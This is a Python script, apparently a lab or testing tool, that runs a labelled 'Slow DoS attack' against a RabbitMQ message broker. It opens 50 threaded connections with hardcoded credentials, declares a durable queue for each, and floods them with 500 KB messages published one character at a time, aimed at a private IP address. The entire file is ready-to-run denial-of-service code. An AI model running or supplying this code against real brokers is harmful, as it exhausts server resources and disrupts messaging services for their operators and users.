import pika
import json
import time
import random
import logging
import threading
from datetime import datetime, UTC

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(message)s'
)
logger = logging.getLogger(__name__)

class SlowDosPublisher:
    def __init__(self, host='localhost', num_connections=50):
        self.host = host
        self.num_connections = num_connections
        self.active_connections = []
        self.connection_params = pika.ConnectionParameters(
            host=self.host,
            port=5672,
            credentials=pika.PlainCredentials('myapp', 'mypassword'),
            heartbeat=300,
            blocked_connection_timeout=150
        )

    def generate_slow_message(self, size_kb=500):
        """Generate a large message with slow delivery."""
        return {
            'timestamp': datetime.now(UTC).isoformat(),
            'message_id': f'SLOW_{random.randint(1000, 9999)}',
            'connection_id': f'CONN_{random.randint(1000, 9999)}',
            'payload': '.' * (size_kb * 1024),  # Create large payload
            'type': 'slow_attack'
        }

    def slow_connection(self, connection_id):
        """Maintain a slow connection that sends messages very slowly."""
        try:
            connection = pika.BlockingConnection(self.connection_params)
            channel = connection.channel()
            
            # Create a unique queue for this connection
            queue_name = f'slow_queue_{connection_id}'
            channel.queue_declare(queue=queue_name, durable=True)
            
            self.active_connections.append(connection)
            logger.info(f"Connection {connection_id} established")

            message_count = 0
            while True:
                try:
                    # Generate and send a large message
                    message = self.generate_slow_message()
                    
                    # Deliberately slow down the sending process
                    for chunk in json.dumps(message):
                        channel.basic_publish(
                            exchange='',
                            routing_key=queue_name,
                            body=chunk,
                            properties=pika.BasicProperties(
                                delivery_mode=1,
                                content_type='application/json'
                            )
                        )
                        time.sleep(0.1)  # Sleep between each character
                    
                    message_count += 1
                    logger.info(f"Connection {connection_id} sent message {message_count}")
                    
                    # Random delay between messages
                    time.sleep(random.uniform(1, 5))
                    
                except Exception as e:
                    logger.error(f"Error in connection {connection_id}: {e}")
                    break

        except Exception as e:
            logger.error(f"Connection {connection_id} failed: {e}")
        finally:
            try:
                connection.close()
                self.active_connections.remove(connection)
            except:
                pass

    def start_attack(self):
        """Start multiple slow connections."""
        logger.info(f"Starting Slow DoS attack with {self.num_connections} connections")
        threads = []

        try:
            for i in range(self.num_connections):
                thread = threading.Thread(
                    target=self.slow_connection,
                    args=(i,),
                    daemon=True
                )
                thread.start()
                threads.append(thread)
                logger.info(f"Started connection thread {i}")
                time.sleep(0.5)  # Gradual connection establishment

            # Monitor active connections
            while True:
                logger.info(f"Active connections: {len(self.active_connections)}")
                time.sleep(5)

        except KeyboardInterrupt:
            logger.info("Stopping Slow DoS attack")
        finally:
            # Cleanup connections
            for conn in self.active_connections:
                try:
                    conn.close()
                except:
                    pass

if __name__ == "__main__":
    # Change the host to your RabbitMQ server IP
    attack = SlowDosPublisher(host='10.0.24.198', num_connections=50)
    attack.start_attack()
